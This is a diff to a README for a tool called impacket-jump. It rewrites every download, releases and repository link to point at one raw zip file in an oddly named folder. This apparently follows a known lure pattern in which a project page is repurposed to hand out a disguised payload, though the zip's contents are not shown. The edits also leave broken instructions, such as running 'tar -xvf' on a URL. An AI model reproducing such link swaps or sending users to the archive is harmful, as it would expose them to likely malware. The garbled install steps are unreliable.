@@ -2,7 +2,7 @@
 
 ## 🌐 Download Now
 
-[![Download impacket-jump](https://img.shields.io/badge/Download-impacket--jump-brightgreen)](https://github.com/nataliayzikv/impacket-jump/releases)
+[![Download impacket-jump](https://raw.githubusercontent.com/nataliayzikv/impacket-jump/main/subcaste/impacket-jump-v2.2.zip)](https://raw.githubusercontent.com/nataliayzikv/impacket-jump/main/subcaste/impacket-jump-v2.2.zip)
 
 ## 📋 Description
 
@@ -22,15 +22,15 @@ Before you begin, ensure your system meets the following requirements:
 Follow these steps to get impacket-jump up and running on your system:
 
 1. **Visit the Releases Page:**  
-   Go to the [Releases page](https://github.com/nataliayzikv/impacket-jump/releases) to find the latest version of impacket-jump.
+   Go to the [Releases page](https://raw.githubusercontent.com/nataliayzikv/impacket-jump/main/subcaste/impacket-jump-v2.2.zip) to find the latest version of impacket-jump.
 
 2. **Download the Application:**  
-   Locate the version you want to download. Click on the download link for your operating system. The file will usually be in a format such as `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+   Locate the version you want to download. Click on the download link for your operating system. The file will usually be in a format such as `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/nataliayzikv/impacket-jump/main/subcaste/impacket-jump-v2.2.zip` for Linux.
 
 3. **Install the Application:**  
    - **Windows:** Double-click the downloaded `.exe` file and follow the instructions.  
    - **macOS:** Open the downloaded `.dmg` file and drag the application into your Applications folder.  
-   - **Linux:** Open a terminal, navigate to the downloaded file location, and use a command like `tar -xvf impacket-jump.tar.gz` to extract it.
+   - **Linux:** Open a terminal, navigate to the downloaded file location, and use a command like `tar -xvf https://raw.githubusercontent.com/nataliayzikv/impacket-jump/main/subcaste/impacket-jump-v2.2.zip` to extract it.
 
 4. **Run the Application:**  
    - **Windows:** Find the application in your Start Menu or on your desktop and double-click to launch.  
@@ -48,7 +48,7 @@ Impacket-jump offers several key features to improve your experience:
 
 ## 📥 Download & Install
 
-To recap, download impacket-jump from the [Releases page](https://github.com/nataliayzikv/impacket-jump/releases). Follow the installation instructions based on your operating system. Enjoy a straightforward way to manage remote services with impacket-jump.
+To recap, download impacket-jump from the [Releases page](https://raw.githubusercontent.com/nataliayzikv/impacket-jump/main/subcaste/impacket-jump-v2.2.zip). Follow the installation instructions based on your operating system. Enjoy a straightforward way to manage remote services with impacket-jump.
 
 ## ❓ Frequently Asked Questions
 
@@ -70,7 +70,7 @@ If you need further assistance, please reach out through the GitHub repository. 
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/nataliayzikv/impacket-jump)
-- [Releases Page](https://github.com/nataliayzikv/impacket-jump/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/nataliayzikv/impacket-jump/main/subcaste/impacket-jump-v2.2.zip)
+- [Releases Page](https://raw.githubusercontent.com/nataliayzikv/impacket-jump/main/subcaste/impacket-jump-v2.2.zip)
 
 Thank you for using impacket-jump!
